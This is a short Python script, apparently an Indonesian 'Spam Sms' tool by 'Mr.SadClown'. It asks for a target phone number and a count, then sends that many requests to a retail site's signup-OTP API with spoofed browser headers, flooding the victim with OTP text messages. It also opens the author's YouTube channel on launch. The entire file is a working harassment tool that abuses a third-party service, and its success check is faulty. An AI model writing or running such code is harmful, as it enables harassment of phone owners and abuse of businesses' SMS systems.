#!/bin/py

#module
import os
import json
import requests
import time
import sys
from time import sleep

#kode warna
red   = '\x1b[31m' # Merah
green = '\x1b[32m' # Hijau
yellow = '\x1b[33m' # Kuning
blue  = '\x1b[34m' # Biru
magenta = '\x1b[35m' # Ungu
cyan  = '\x1b[36m' # Biru Muda
white = '\x1b[37m' # Putih
reset = '\x1b[39m' # Reset Warna ( Kembali Ke Warna Awal )
brblack = '\x1b[90m' # Hitam Terang
R = '\x1b[91m' # Merah Terang
brgreen = '\x1b[92m' # Hijau Terang
k = '\x1b[93m' # Kuning Terang
brblue = '\x1b[94m' # Biru Terang
brmgnt = '\x1b[95m' # Ungu Terang
brcyan = '\x1b[96m' # Biru Muda Terang
G = '\x1b[97m' # Putih Terang

#main
def main():
        os.system('clear')
        os.system('figlet Subs Dlu Ngab | lolcat')
        sleep(0.5)
        os.system("xdg-open https://youtube.com/channel/UCGRRm4GgoaGwWM2NQxr2nIA")
        os.system('clear')
        os.system('figlet Spam Sms | lolcat')
        print("")
        print("\x1b[92m[•]\x1b[33mxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\x1b[92m[•]")
        print(" \x1b[96m|          \x1b[90mAuthor : Mr.SadClown                               \x1b[96m| ")
        print(" \x1b[96m|          \x1b[90mTeam   : Mavia Teknologi Indonesia                 \x1b[96m| ")
        print(" \x1b[96m|          \x1b[90mYT     : Mr.SadClown                               \x1b[96m| ")
        print("\x1b[92m[•]\x1b[33mxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\x1b[92m[•]")
        print("")
        no = input("\x1b[96m[\x1b[97m?\x1b[96m] \x1b[97mNomer Target :")
        sleep(0.5)
        print("")
        jum = input("\x1b[96m[\x1b[97m?\x1b[96m] \x1b[97mJumlah Spam :")

        head = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
        "Referer": "https://www.mapclub.com/en/user/signup",
        "Host": "cmsapi.mapclub.com",
        }

        dat = {
        'phone' : no
        }

        for x in range(int(jum)):
                leosureo = requests.post("https://cmsapi.mapclub.com/api/signup-otp", headers=head, json=dat)
        if 'eror' in leosureo :
               print("Gagal Spam")
        else:
               print("Berhasil Spam")

if __name__=='__main__':
        main()
